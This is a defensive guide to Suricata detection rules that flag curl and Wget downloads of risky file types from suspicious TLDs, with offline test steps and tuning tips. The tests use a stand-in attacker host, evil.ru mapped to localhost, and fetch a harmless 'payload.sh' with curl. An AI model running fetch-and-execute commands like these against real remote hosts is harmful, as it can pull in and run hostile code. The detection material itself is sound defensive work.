# Suricata Rules: Detecting curl/wget Downloads from Suspicious TLDs

This guide provides custom Suricata rules to detect file downloads from suspicious TLDs using **curl** or **wget**. It includes explanations, test methods, and tuning advice.

---

## 1) HTTP: curl / wget downloading “risky” file types from suspicious TLDs

**What it looks for**
- Matches HTTP `GET` requests
- User-Agent contains `curl/` or `Wget/`
- Host ends with suspicious TLD (e.g., `.ru`, `.cn`, `.su`, `.tk`, `.top`, `.xyz`, `.zip`, `.click`, `.pw`)
- URI ends with risky file extensions (e.g., `.exe`, `.dll`, `.ps1`, `.bat`, `.js`, `.sh`, `.py`, `.zip`, `.tar`, `.gz`, `.deb`, `.rpm`, `.apk`, `.msi`)
- ```flow:established,to_server``` The rule will only trigger on packets that are part of an already established network connection and are traveling from the client to the server. This combination ensures the rule is more specific, matching on the bidirectional flow of an active session and focusing only on the initial direction of data.

```suricata
# 100001 — curl + suspicious TLD + risky file extension (HTTP)
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"HTTP curl file download from suspicious TLD";
    flow:established,to_server;
    http.method; content:"GET";
    http.user_agent; content:"curl/"; nocase;
    http.host; pcre:"/\.(ru|cn|su|tk|top|xyz|zip|click|pw)$/Ri";
    http.uri;  pcre:"/\.(exe|dll|ps1|bat|js|sh|py|zip|tar(?:\.gz)?|tgz|xz|deb|rpm|apk|msi)(?:\?|$)/Ri";
    classtype:policy-violation;
    metadata: attack_target Client, created_at 2025_08_26, mitre_tactic Execution, mitre_technique_id T1204;
    sid:100001; rev:1;
)

# 100002 — Wget + suspicious TLD + risky file extension (HTTP)
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"HTTP Wget file download from suspicious TLD";
    flow:established,to_server;
    http.method; content:"GET";
    http.user_agent; content:"Wget/"; nocase;
    http.host; pcre:"/\.(ru|cn|su|tk|top|xyz|zip|click|pw)$/Ri";
    http.uri;  pcre:"/\.(exe|dll|ps1|bat|js|sh|py|zip|tar(?:\.gz)?|tgz|xz|deb|rpm|apk|msi)(?:\?|$)/Ri";
    classtype:policy-violation;
    metadata: attack_target Client, created_at 2025_08_26, mitre_tactic Execution, mitre_technique_id T1204;
    sid:100002; rev:1;
)
```
***Why this works***

- http.user_agent reliably carries curl/ or Wget/ unless the operator spoofs it.

- ```http.host``` + ```pcre``` anchors on ***TLD*** at ***end of host.***

- ```http.uri``` + ```pcre``` looks for ***file extensions*** at ***URI end*** (allows query strings via ```(?:\?|$))```.

- Keeping the checks in separate sticky buffers avoids false matches across fields. (see notes about new suricata 7 behavior with sticky buffers - https://github.com/tskinnerarlo/Bridging-Host-and-Network/blob/main/suricata_sticky_buffers.md)
---

## How to Test

**Step 1: Add a fake suspicious domain to ``/etc/hosts``**

On your test machine:
```bash
echo "127.0.0.1 evil.ru" | sudo tee -a /etc/hosts
```

This maps ```evil.ru``` to your localhost.

**Step 2: Start a simple HTTP server**

In a test directory:
```bash
mkdir -p ~/webroot && cd ~/webroot
echo 'echo "malicious payload"' > payload.sh
python3 -m http.server 8000
```

This serves ```payload.sh``` at ```http://evil.ru:8000/payload.sh.```

**Step 3: Run the test with curl**
```bash
curl http://evil.ru:8000/payload.sh -o /tmp/payload.sh
```

- ```curl/``` appears in the User-Agent header.

- ```Host``` header = ```evil.ru``` (suspicious TLD).

```URI``` = ```/payload.sh``` (risky extension).

**Step 4: Verify Suricata alert**

If Suricata is monitoring the interface (```lo``` or ```eth0```) and logging to ```eve.json```:
```bash
jq 'select(.alert != null) | {timestamp,src_ip,dest_ip,alert}' /var/log/suricata/eve.json
```

You should see something like:
```json
{
  "timestamp": "2025-08-26T15:42:01.123456Z",
  "src_ip": "127.0.0.1",
  "dest_ip": "127.0.0.1",
  "alert": {
    "action": "allowed",
    "gid": 1,
    "signature_id": 100001,
    "rev": 1,
    "signature": "HTTP curl file download from suspicious TLD",
    "category": "Policy Violation",
    "severity": 1
  }
}
```

## 2) TLS/SNI: curl or wget to suspicious TLDs (best-effort)

For HTTPS, you can’t see the HTTP headers or URI, so you can’t confirm a “file download.” But you can still flag curl/wget-like tooling to suspicious TLDs using SNI (and optionally JA3 if you have known hashes in your environment).

```suricata
# 100003 — TLS SNI to suspicious TLD (any client). Use as context signal.
alert tls $HOME_NET any -> $EXTERNAL_NET any (
    msg:"TLS SNI to suspicious TLD";
    flow:established,to_server;
    tls.sni; pcre:"/\.(ru|cn|su|tk|top|xyz|zip|click|pw)$/Ri";
    tls.version:1.0-1.3;
    classtype:policy-violation;
    metadata: created_at 2025_08_26, confidence Moderate, note "Cannot see file names over TLS";
    sid:100003; rev:1;
)


# Optional JA3 matching can be added if you maintain known hashes.

# 100004 — OPTIONAL: if you maintain a list of curl/wget JA3 hashes internally, add them here.
# Replace the example hash values with *your* observed JA3 hashes for curl/wget builds in your fleet.
# alert tls $HOME_NET any -> $EXTERNAL_NET any (
#     msg:"TLS suspicious TLD with known curl/wget JA3";
#     flow:established,to_server;
#     tls.sni; pcre:"/\.(ru|cn|su|tk|top|xyz|zip|click|pw)$/Ri";
#     ja3_hash; content:"<your_curl_ja3_hash>";
#     classtype:policy-violation;
#     metadata: created_at 2025_08_26, confidence Low-Moderate, note "JA3 varies by TLS lib";
#     sid:100004; rev:1;
# )
```

Tip: Keep the TLS rule at lower priority (or add metadata: priority low) so it’s correlated as context with proxy/DNS/EDR evidence rather than paging your SOC by itself.

## How to Test

**Step 1: Add the fake suspicious domain**

Append to your /etc/hosts:

```bash
echo "127.0.0.1 evil.ru" | sudo tee -a /etc/hosts
```

**Step 2: Create a self-signed certificate with CN = evil.ru**

```bash
mkdir ~/tls-test && cd ~/tls-test

# Generate private key
openssl genrsa -out evil.key 2048

# Generate self-signed cert valid for "evil.ru"
openssl req -new -x509 -key evil.key -out evil.crt -days 365 -subj "/CN=evil.ru"
```

**Step 3: Start a TLS server on localhost**

Use openssl s_server:

```bash
openssl s_server -key evil.key -cert evil.crt -accept 8443 -www

```

This creates a minimal HTTPS server on port 8443.

**Step 4: Connect with curl specifying the SNI**
```bash
curl -vk https://evil.ru:8443/
```
- -k ignores the untrusted cert.

- Because the hostname evil.ru is used, curl will send SNI = evil.ru in the TLS ClientHello.

**Step 5: Run Suricata to capture traffic**

If monitoring live:
```bash
sudo suricata -i lo -S /path/to/suricata_suspicious_downloads.rules -l /var/log/suricata
```

Or capture to a pcap:
```bash
tcpdump -i lo -w tls-test.pcap port 8443
suricata -r tls-test.pcap -S /path/to/suricata_suspicious_downloads.rules -l /tmp/suri-test
```
**Step 6: Check for the alert**

In ```eve.json```, you should see:
```json
{
  "timestamp": "2025-08-26T16:55:01.123456Z",
  "src_ip": "127.0.0.1",
  "dest_ip": "127.0.0.1",
  "alert": {
    "signature_id": 100003,
    "rev": 1,
    "signature": "TLS SNI to suspicious TLD",
    "category": "Policy Violation",
    "severity": 1
  }
}
```

✅ This proves the TLS/SNI rule works entirely offline:

```evil.ru``` provided by ```/etc/hosts```

self-signed cert bound to ```evil.ru```

Suricata inspects TLS handshake, sees SNI, triggers rule

## Tuning Tips
- **TLD list**: Start narrow (e.g., ```ru|cn|su|zip```) and expand based on your threat intel & business profile to reduce noise.

- **Extensions list**: Keep only the truly risky types for your environment. If you see FPs on archives for normal dev workflows, split the archive extensions into a separate, lower-priority rule.

- **User-Agent spoofing**: Attackers may change UAs. Consider companion rules that don’t require curl/wget UAs but still key on risky extensions + suspicious TLDs during off-hours, or when the referrer is empty.

- **Correlate with DNS/Proxy/EDR**: Use these alerts as pivots to validate if the resulting file executed or matched malware reputation.



## Rule maintenance
- Use local SID space (`1,000,000-1,999,999`) if you already run community/pro rules.
- Track your changes with ```rev``` and keep notes in ```metadata``` (date, who changed what, why).

